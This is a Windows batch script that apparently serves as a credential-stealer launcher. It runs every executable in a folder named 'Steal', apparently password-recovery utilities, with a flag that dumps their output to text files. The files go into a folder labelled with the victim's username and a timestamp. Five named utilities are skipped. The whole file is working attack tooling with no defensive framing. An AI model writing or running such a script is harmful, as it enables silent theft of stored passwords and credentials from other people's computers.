@echo off

setlocal enabledelayedexpansion
set appFolder=Steal
set parentfolder=%CD%\%appFolder%\

SET HOUR=%TIME:~0,2%
IF "%HOUR:~0,1%" == " " SET HOUR=0%HOUR:~1,1%

set resultFolder=Result_%USERNAME%_%DATE:~6,4%%DATE:~3,2%%DATE:~0,2%%HOUR%%time:~3,2%%time:~6,2%

cd %appFolder%
md %resultFolder%

for /r . %%g in (*.exe) do (
  set "var=%%g"
  set var=!var:%parentfolder%=!
  if "x!var:~-4!"=="x.exe" (
    set var=!var:~0,-4!
  )

  if "!var!" NEQ "Dialupass" (
  if "!var!" NEQ "netpass" (
  if "!var!" NEQ "OpenedFilesView" (
  if "!var!" NEQ "WirelessKeyView" (
  if "!var!" NEQ "WNetWatcher" (
      start %%g /stext %resultFolder%/!var!.txt
  )))))
 
)

exit